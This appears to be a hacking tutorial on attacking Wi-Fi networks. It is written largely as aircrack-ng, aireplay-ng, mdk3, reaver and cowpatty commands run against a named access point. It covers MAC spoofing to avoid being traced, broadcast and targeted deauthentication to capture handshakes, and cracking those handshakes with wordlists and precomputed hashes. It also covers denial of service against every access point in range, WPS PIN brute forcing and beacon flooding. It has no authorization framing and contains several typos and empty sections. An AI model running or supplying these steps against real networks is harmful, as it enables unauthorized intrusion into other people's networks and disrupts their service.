## Author  -  IRVING ST  -  (Comandre-ex)

This article seeks to teach from basic attacks and hacking techniques to wireless networks to advanced ones. In the following table you can see the different topics that will be addressed.

``` shell
* concepts
* Network card configuration
* Configuration of (TX)
* Network mapping in our environment
* Change MAC address of the network interface
* Attacks on WPA networks with PSK authentication
* Attacks on WEB networks with clients without SKA authentication
* Attacks on WEB networks with clients and SKA authentication
* Attacks on WEB networks without clients
* Attacks on WEB networks with WPS activated
* beacon charge attack
* CTS frame attack
* DoS attack
* Cracked handshake
* track location using essid network
* Creation of rainbow tables.
* Bypass MAC filtering
```

``` monitor mode concept```

In wireless networks, radio waves are used using the air as a medium. The monitor mode would be what will make us as attackers able to capture these packets.

first we learn to configure the network card to put it in monitor mode.

``` shell
* start monitor mode

$ sudo  airmon-ng start wlxc01c30150e36 

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    535 NetworkManager
    547 wpa_supplicant

PHY	Interface	Driver		Chipset

phy0	wlxc01c30150e36	ath9k_htc	Qualcomm Atheros Communications AR9271 802.11n
Interface wlxc01c30150e36mon is too long for linux so it will be renamed to the old style (wlan#) name.

		(mac80211 monitor mode vif enabled on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlxc01c30150e36)

* Check if the card is in monitor mode.

$ iwconfig  wlan0mon   
wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

*  check monitor mode by filtering the output

$ echo;iwconfig wlan0mon | head  -n 1 |  cut -d  ' ' -f 6

      Mode:Monitor


*  kill conflicting processes

$ sudo  airmon-ng check  killl 

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    535 NetworkManager
    547 wpa_supplicant


```

```transmit power setting (TX)```

The TX (transmit) power of a network interface refers to the amount of power used to transmit data from that interface to the network. Just like Ethernet or Wi-Fi, network devices such as routers, switches, or network cards use interfaces to send data over the wire or wirelessly. The TX power of an interface determines the strength of the signal that is sent

NOTE: ```The TX power depends on each region```.

```transmit power setting (TX)```

``` * For this I will leave you a list with the codes of each region ```

``` shell 
     "00" - World Region (no country-specific restrictions)
     "BO" - World Region with Country-Specific Restrictions
     "US" - United States
     "EU" - European Union
     "JP" - Japan
     "CN" - Chinese
     "IN" - India
     "KR" - South Korea
     "RU" - Russia
     "AU" - Australian
     "BR" - Brazil
     "MX" - Mexico
     "ZA" - South Africa
     "IL" - Israel
     "TH" - Thailand
```
``` configuration of (TX)  ```

``` shell
* put the network interface in normal mode
$ sudo iw dev wlan0mon set type managed
* set the region
$ iw  reg set <region code> 
* sets the transmit (TX) power of the network interface
$ iwconfig < Network  Interface> <txpower> <NmW|NdBm|off|auto>
*  Set transmit power to 20 dBm
$ iwconfig <Network  Interface> txpower 20dB
* Set transmit power to 10 dBm
$ iwconfig <Network Interface> txpower 10dB
* Turn off transmit power
$ iwconfig wlan0mon txpower off
```

``` handshake concept ```

When we connect to an access point in the process, the password is encrypted, this is called a ```HANDSHAKE```.


``` mac address concept ```

It is the physical address that will identify each device. This is built in 48 bits in hexadecimal, it is divided into two parts, one that identifies the provider and the other the device.

```bssid and essid  concepts```

the ```bssid``` is the mac address that identifies the AP

the ```essid``` is the name of the AP


Once leaving the first concepts that we are going to need for the first attacks, we can begin.

Note: for this we should already have configured all of the above

### map networks

### change mac address

It would be a shame if while we're playing we get tracked by ```MAC ADDRESS``` right. For this we will change our ```MAC ADDRESS``` by pretending to be another device.


``` shell
Note: To change the (mac address) of an interface, it must first be turned off. Once changed, we will proceed to turn the interface on

* turn off interface

$ ifconfig  <Network Interface> down
$ ifconfig   wlan0  down

* turn on interface

$ ifconfig  <Network Interface> up

### broadcast deauthentication attack

When we connect our mobile to an ```AP``` such as the one in your grandmother's house and then we leave but we return in a week, the device connects automatically, right? The device will reassociate and send the encrypted password ```(HANDSHAKE)``` to the ```AP``` by the same as the first time we connected our device to the ```AP```.


So this for us as darknet hackers!!!
We already have a very powerful attack vector. Well, we recorded that wireless networks are a shared medium and use radio frequency as a medium, which means that we can capture the ```(Hanshake)``` when the mobile reassociates. To later crack that password but we are not going to wait every time a client connects or reassociates. So we will disconnect the clients that are in the NETWORK by sending deauthentication packets to the AP using the MAC BROADCAST as an objective in order to disconnect all the clients.

Note: for this we must already have the interface in ```monitor mode```. First we will proceed to scan our environment in this part we will import only 3 fields ```(BSSID, #CH, ESSID)```

```For this I will target the AP INFINITUM4E5F```



```  shell
* environment analysis

$  airodump-ng  wlan0mon 

Note: once we have fixed the channel bssid and essid of our target. We will proceed to apply a filter

* filtered analysis

$ airodump-ng --channel <channel> --bssid  <bssid>  --essid <essid>  <Network interface>

$ airodump-ng --channel 1 --bssid  50:02:38:7A:40:79  --essid INFINITUM4E5F  wlan0mon

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

Note: Once we have the filtering, we will need a file to save the (HANDSHAKE) 
to crack it later and other network information. So we will proceed to export the evidence

* Evidence export

$ airodump-ng --channel <channel> --bssid  <bssid>  --essid <essid>  -w  <file> <Network Interface> 

$ airodump-ng --channel 1 --bssid  50:02:38:7A:40:79  --essid INFINITUM4E5F -w Captura wlan0mon 

Note: we will leave airodump-ng running while we prepare to send deauthentication packets with aireplay-ng

* sending deauthentication packets

$  aireplay-ng -0 <number of packages> -e <essid> -c FF:FF:FF:FF:FF:FF wlan0mon


$  aireplay-ng -0 10 -e INFINITUM4E5F -c FF:FF:FF:FF:FF:FF wlan0mon

```

![](/assets/images/wireless/handshake.png)

Once the disguise packages have been sent, we will revive in the Airodump window if we manage to capture the handshake. We will realize this if this appears this at the top of the Airodump.


### cracking  handshake

To decrypt the ```handshake``` there are multiple ways and tools to do it. So we'll look at the basic ones and then the more complex ones like the rainbow tables.


This HANDSHAKE decryption process works by passing a dictionary to the tool, then it finds the format in which it is encrypted, if we have not specified the format, the tool will read each line of the dictionary provided and encrypt the password in the same format of the HANDSHAKE and then Compare it to the HANDSHAKE. This process will do it for each line of the file. At the moment that the password of a dictionary is equal to the HANDSHAKE this will be the password of the AP


To crack the ```handshake``` there are multiple forms and ways as well as tools to realiozar this. So we will see basics first without creating rainbow tables

```Note: Upon review we will see that there are 5 files with different extensions. each one has its possible uses but we will only look at the ending with the extension (.cap) since it will contain the HANDSHAKE inside```


```  shell

*  install wordlists

* SecLists

$ git clone https://github.com/danielmiessler/SecLists.git

$ apt -y install seclists

* Rockyou.txt

$ cd /usr/share/wordlists/

$ 7z x rockyou.txt


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


* Cracking  handshake  aircrack-ng

$ aircrack-ng  -w  <dictionary> <Captura>

$ aircrack-ng  -w  /usr/share/wordlist/rockyou.txt Captura-01.cap 

Note: When the password is located, the cracking stops and we will see the password inside the 
`Key Found field! [Greeneggsandham]`


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


* Cracking  handshake  cowpatty

$ cowpatty -f <wordlist> -r  <capture file> -s <ap essid>

$ cowpatty -f /usr/share/wordlists/rockyou.txt -r Captura-01.cap -s  INFINITUM4E5F

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

* Create pre-computed hash and  creating rainbow tables

Note: cowpatty supports the use of a pre-computed hash file making cracking the HANDSHAKE 1000x faster

$ genpmk -f <wordlist> -d <output file> -s <essid>

$ genpmk -f /usr/sha/wordlist/rockyou.txt -d passwords -s INFINITUM4E5F

* Use of our precomputed passwords

$ cowpatty -d passwords -r Captura-01.cap -s INFINITUM4E5F

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


* Cracking  handshake  pyrit

$ pyrit -r  <captura> -b <bssid>-i  <wordlist> attack_passthrough

$ pyrit -i <wordlist> import_passwords

$ pyrit -e <essid> create_essid

$ pyrit  batch

$ pyrit -r <captura> attack_db

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

* Cracking handshake john  and  convert shape

$ hccap2john <Captura> > <file>
$ hccap2john Captura-01.cap > hash

** cracking  hash

$ john hash 

```

```Note: if we get to delete the terminal or do not remember the password.
We're not going to be cracking the hash every time we want the password, right? 
To avoid this john remembers the password we can do this with the following command```

``` shell
* Display previously cracked hash

$ john  --show Captura-01.cap 
```



### Directed disagreement attack

This attack is almost the same as the broadcast deauthentication attack. But this time we will look at a single specific client to deauthenticate it.


``` shell

* Airodump filter

$ airodump-ng --channel 1 --bssid  50:02:38:7A:40:79  --essid INFINITUM4E5F  wlan0mon

Note: the clients MAC can be obtained with airodump-ng in the `STATION` section. This section shows the macs of the devices connected to the `AP`

* Client deauthentication 08:00:27:07:41:7e 

$ aireplay-ng -0 10 -e INFINITUM4E5F -c <mac client> wlan0mon

$ aireplay-ng -0 10 -e INFINITUM4E5F -c 08:00:27:07:41:7e wlan0mon

```


### Fake authentication attack

For this attack we imagine a scenario in which we have an ```AP``` without any client connected and we want to take a packet and inject it. But for that packet to be minimally accepted, it would have to be from an authenticated ```MAC ADDRESS``` associated with the ```AP```.

So when we carry out this attack we will manage to pass ourselves off as a previously authenticated and associated client in the ```AP```

Note: even if we make the ```AP``` believe that we are associated and authenticated, this will not give us access to the ```AP```, we will use this to capture the ```HANDSHAKE```



``` shell 
* Airodump filter  

$  airodump-ng --channel 1 --bssid  50:02:38:7A:40:79  --essid INFINITUM4E5F  wlan0mon

* Fake authentication attack

$ aireplay-ng  -1 0 -b 50:02:38:7A:40:79 -e  INFINITUM4E5F  wlan0mon

```

### denial of service 

This type of attack is one of the most common due to its DDoS variation, not only in wireless networks but also to attack services, servers, etc. In this case it is done in order to leave a wireless network unable to operate. This is achieved by generating an overwhelming amount of traffic or by sending too large a number of deauthentication packets saturating the AP.

There are several ways to perform a DoS in a wireless network. here we can see some



``` shell 

* DoS aireplay-ng  

$ aireplay-ng  -0 0 --essid INFINITUM4E5F -c FF:FF:FF:FF:FF:FF  wlan0mon

* DoS  mdk3
$  mdk3 <Network Interface>  a -m  <mac ap> -m FF:FF:FF:FF:FF:FF
$  mdk3 wlan0mon  a -m  E8:AB:F3:A6:BF:08 -m FF:FF:FF:FF:FF:FF

* DoS a todos los AP de nuestro alcance
$  mdk3 <Network Interface> a
$  mdk3 wlan0mon a
```


### wps attack

WPS was created to improve the connectivity of devices to the AP. This is made up of 8 numerical digits. However, this is also a risk as many routers allow you to authenticate with PIN instead of using password, even though WPS is enabled, it allows an attacker to brute force a PIN guess to authenticate against the network, also gaining the password of the AP.


``` shell 
* scan networks in our range with WPS activated 

`wash parameters`

[-i] Netowork Interface
[-2] Use 2.4GHz 802.11 channels
[-5] Use 5GHz 802.11 channels
[-s] Scan mode

$ wash -i  <Network  Interface>  -25 -s
$ wash -i   wlan0mon -25 -s

* Wps brute force attack

`reaver parameters`

[-i] Network  Interface
[-v,-vvv] Verbose
[-k] Number of offline attacks
[-c] Channel
[-b] bssid
[-L] Ignore locked WPS state.
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[-N] Don’t send NACK packets when errors are detected.
[-d] Delay  seconds between PIN attempts.
[-T] Set timeout period to half a second.
[-r] Rest of attempts by time

* rainbow attack

$ reaver -i wlan0mon -c 6 -b AA:BB:CC:XX:YY:ZZ -vvv -K  1

* Based between times

$ reaver -i wlan0mon -c 6 -b 00:23:69:48:33:83  -vv -L -N -d 15 -T .5 -r 3:15 

* Specify wps pin

$ raver -i  wlan0mon -c 6 -b 00:23:69:48:33:83  -p <PinCode> 

```

### beacon flood attack  

```A beacon packet in a packet containing AP information. Like the channel where it is located, type of encryption, the essid etc. ```

This attack consists of sending too many beacon packets in order to saturate the channel and confuse a possible user who wants to connect to the AP, so it is recommendable to use an ESSID almost equal to that of the target AP.


``` shell
* Creating dictionaries with ESSID 

for i in $(seq 1 500);do echo "INFINITUM${i}E${i}F" >> networks.txt;done

* Execution of beacon flood attack with mdk

$ mdk3 <interface> b -f <file essid> -a -s <maximum packets> -c  <channel>
$ mdk3 wlan0mon b -f networks.txt -a -s 1000  -c 7

* analysis with filtering with tcpdump

$ tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null 

* analysis with filtering with tcpdump

$ tcpdump -i wlan0mon -s0 -vvv 'wlan[0] & 0x0C == 0x08' 2>/dev/null

```
